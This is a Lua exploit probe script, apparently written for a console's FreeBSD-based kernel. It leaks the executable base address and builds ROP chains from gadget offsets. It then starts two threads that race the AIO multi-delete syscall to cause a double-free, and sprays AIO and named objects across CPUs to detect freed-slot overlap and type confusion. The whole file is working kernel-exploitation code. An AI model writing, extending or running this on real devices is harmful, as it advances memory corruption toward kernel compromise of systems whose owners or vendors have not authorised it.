-- CRASH_CLASS: HIGH
-- PROBE 67m2: Does 663 read from the tracking object or the ID table?
--
-- After double-free, spray AIO on two CPUs. If objects overlap:
-- Delete CPU 1's set, check if CPU 0's 663 status changes.
-- Also allocate namedobj to fill freed slots and recheck.

print("=== PROBE 67m2: 663 OVERLAP TEST ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end
local function put_str(s) local p=memory.alloc(#s+2) for i=1,#s do pcall(function() memory.write_byte(p+i-1,string.byte(s,i)) end) end pcall(function() memory.write_byte(p+#s,0) end) return p end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib)+0x108) or 0; local ehi = rd(N(ib)+0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local function fmt(val) if val==nil then return "nil" end local h,l=get_hi_lo(val) return string.format("0x%08X%08X",h,l) end
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa)+8, 0); wq(uint64(N(sa)+16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_zero()
    wq(N(reqs), uint64(1)); wq(N(reqs)+8, uint64(16))
    local bh,bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
    local rh,rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
    wd(N(reqs)+0x20, fd_zero); wd(N(reqs)+0x24, 0); wd(N(one_id), 0)
    pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(1),uint64(N(one_id))) end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end
local function check_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    local ret = sgn(mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))))
    return ret, rd(N(one_st)) or 0xDEADDEAD
end

local pin_buf = memory.alloc(8)
local function set_cpu(mask)
    wq(N(pin_buf), uint64(mask))
    pcall(function() mk(488)(uint64(3),uint64(2),uint64(pid_val),uint64(8),uint64(N(pin_buf))) end)
end

-- =============================================
-- [A] CONTROL: 663 on deleted-then-reallocated slot
-- =============================================
print("")
print("-- [A] CONTROL: 663 after delete --")
local ctrl_id = submit_zero()
poll_one(ctrl_id)
local r0, s0 = check_663(ctrl_id)
print(string.format("  alive:   ret=%d st=0x%08X", r0, s0))
delete_one(ctrl_id)
local r1, s1 = check_663(ctrl_id)
print(string.format("  deleted: ret=%d st=0x%08X", r1, s1))

-- Allocate 20 more AIO to try to reclaim the freed slot
for i = 1, 20 do
    local id2 = submit_zero()
    if id2 ~= 0 then poll_one(id2); delete_one(id2) end
end
local r2, s2 = check_663(ctrl_id)
print(string.format("  reused:  ret=%d st=0x%08X", r2, s2))

-- =============================================
-- [B] GATED RACE - 5 iters
-- =============================================
print("")
print("-- [B] RACE --")

local BATCH = 16
local del_ids = memory.alloc(4*BATCH+0x10)
local states_A = memory.alloc(4*BATCH+0x10)
local states_B = memory.alloc(4*BATCH+0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8); wd(N(wbyte), 0x42)

local sp_gA = memory.alloc(16); wd(N(sp_gA), -1); wd(N(sp_gA)+4, -1)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_gA))) end)
local gra = rd(N(sp_gA)) or -1; local gwa = rd(N(sp_gA)+4) or -1

local sp_gB = memory.alloc(16); wd(N(sp_gB), -1); wd(N(sp_gB)+4, -1)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_gB))) end)
local grb = rd(N(sp_gB)) or -1; local gwb = rd(N(sp_gB)+4) or -1

if gra < 0 or grb < 0 then print("gate fail"); return end

local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)
local total_doubles = 0

for iter = 1, 5 do
    if not alive() then break end
    local ids = {}
    for i = 1, BATCH do
        local id = submit_zero()
        if id ~= 0 then poll_one(id); ids[#ids+1] = id end
    end
    if #ids < BATCH then break end

    for i = 0, BATCH-1 do
        wd(N(del_ids)+i*4, ids[i+1])
        wd(N(states_A)+i*4, 0xAA)
        wd(N(states_B)+i*4, 0xBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    local sb = N(stk_A)
    for i = 0, 0x1FFC, 4 do wd(sb+i, 0) end
    local sp = sb + 0x2000 - ((sb+0x2000)%16) - 8
    local o = 0
    local function wa(v) wq(sp+o, v); o = o+8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    sb = N(stk_B)
    for i = 0, 0x1FFC, 4 do wd(sb+i, 0) end
    sp = sb + 0x2000 - ((sb+0x2000)%16) - 8
    o = 0
    local function wb(v) wq(sp+o, v); o = o+8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa)+0x10, uint64(N(stk_A)))
    wq(N(pa)+0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb)+i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb)+0x10, uint64(N(stk_B)))
    wq(N(pb)+0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    local a2, b2 = false, false
    for w = 1, 500000 do
        if not a2 and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a2 = true end
        if not b2 and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b2 = true end
        if a2 and b2 then break end
    end
    if not (a2 and b2) then print("TIMEOUT iter " .. iter); break end

    for d = 1, 500 do end
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)
    for w = 1, 100000 do end

    local doubles = 0
    for i = 0, BATCH-1 do
        local sA = rd(N(states_A)+i*4) or 0xAA
        local sB = rd(N(states_B)+i*4) or 0xBB
        if sA == 0 and sB == 0 then doubles = doubles+1 end
    end
    total_doubles = total_doubles + doubles
    if doubles > 0 then
        print(string.format("  iter %d: %d doubles", iter, doubles))
    end
end
print("total_doubles=" .. total_doubles)
if total_doubles < 1 or not alive() then print("SKIP"); print("=== 67m2 DONE ==="); return end

-- =============================================
-- [C] SPRAY + 663 OVERLAP TEST
-- =============================================
print("")
print("-- [C] SPRAY + CHECK --")

-- CPU 0: submit 64 AIO, poll
set_cpu(1)
local setX = {}
for i = 1, 64 do
    local id = submit_zero()
    if id ~= 0 then poll_one(id); setX[#setX+1] = id end
end
print(string.format("  setX (cpu0): %d", #setX))

-- Record 663 baseline for setX
local baseline = {}
for i = 1, #setX do
    local _, s = check_663(setX[i])
    baseline[i] = s
end

-- CPU 1: submit 64 AIO, poll
set_cpu(2)
local setY = {}
for i = 1, 64 do
    local id = submit_zero()
    if id ~= 0 then poll_one(id); setY[#setY+1] = id end
end
print(string.format("  setY (cpu1): %d", #setY))

-- Delete ALL of setY -- if overlapping, shared tracking gets "deleted" status
local dy_ok = 0
for i = 1, #setY do
    local st = delete_one(setY[i])
    if st == 0 then dy_ok = dy_ok+1 end
end
print(string.format("  deleted setY: ok=%d", dy_ok))

set_cpu(0x7F)

-- =============================================
-- [D] CHECK: 663 on setX after setY deleted
-- =============================================
print("")
print("-- [D] 663 CHECK --")
local changed = 0
local details = {}
for i = 1, #setX do
    local _, s = check_663(setX[i])
    if s ~= baseline[i] then
        changed = changed + 1
        if #details < 15 then
            details[#details+1] = string.format("  X[%d] id=0x%X: 0x%08X -> 0x%08X", i, setX[i], baseline[i], s)
        end
    end
end
print(string.format("  663 changed: %d/%d", changed, #setX))
for _, s in ipairs(details) do print(s) end

if changed > 0 then
    print("  *** 663 READS FROM TRACKING -- OVERLAP DETECTED ***")
end

-- =============================================
-- [E] FILL + RECHECK: allocate namedobj to fill freed slots
-- =============================================
if alive() and changed == 0 then
    print("")
    print("-- [E] NAMEDOBJ FILL --")
    set_cpu(2)
    local nobj = {}
    for i = 1, 64 do
        local name = put_str(string.format("test_%04d", i))
        local ret = sgn(mk(557)(uint64(N(name)), uint64(0)))
        if ret >= 0 then nobj[#nobj+1] = ret end
    end
    print(string.format("  created %d namedobjs", #nobj))

    set_cpu(0x7F)

    local changed2 = 0
    local details2 = {}
    for i = 1, #setX do
        local _, s = check_663(setX[i])
        if s ~= baseline[i] then
            changed2 = changed2 + 1
            if #details2 < 15 then
                details2[#details2+1] = string.format("  X[%d] id=0x%X: 0x%08X -> 0x%08X", i, setX[i], baseline[i], s)
            end
        end
    end
    print(string.format("  663 changed after namedobj: %d/%d", changed2, #setX))
    for _, s in ipairs(details2) do print(s) end
    if changed2 > 0 then
        print("  *** NAMEDOBJ OVERLAP -- CROSS-TYPE CONFUSION! ***")
    end

    -- Cleanup namedobjs
    for _, h in ipairs(nobj) do
        pcall(function() mk(558)(uint64(h)) end)
    end
end

-- =============================================
-- [F] ALSO TRY: submit NEW AIO on CPU 1 to fill freed slots
-- =============================================
if alive() and changed == 0 then
    print("")
    print("-- [F] AIO REFILL --")
    set_cpu(2)
    local setZ = {}
    for i = 1, 64 do
        local id = submit_zero()
        if id ~= 0 then poll_one(id); setZ[#setZ+1] = id end
    end
    print(string.format("  setZ (cpu1 refill): %d", #setZ))

    set_cpu(0x7F)

    local changed3 = 0
    local details3 = {}
    for i = 1, #setX do
        local _, s = check_663(setX[i])
        if s ~= baseline[i] then
            changed3 = changed3 + 1
            if #details3 < 15 then
                details3[#details3+1] = string.format("  X[%d] id=0x%X: 0x%08X -> 0x%08X", i, setX[i], baseline[i], s)
            end
        end
    end
    print(string.format("  663 changed after refill: %d/%d", changed3, #setX))
    for _, s in ipairs(details3) do print(s) end
    if changed3 > 0 then
        print("  *** AIO REFILL OVERLAP! ***")
    end

    for _, id in ipairs(setZ) do delete_one(id) end
end

-- Cleanup setX
for _, id in ipairs(setX) do delete_one(id) end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67m2 DONE ===")
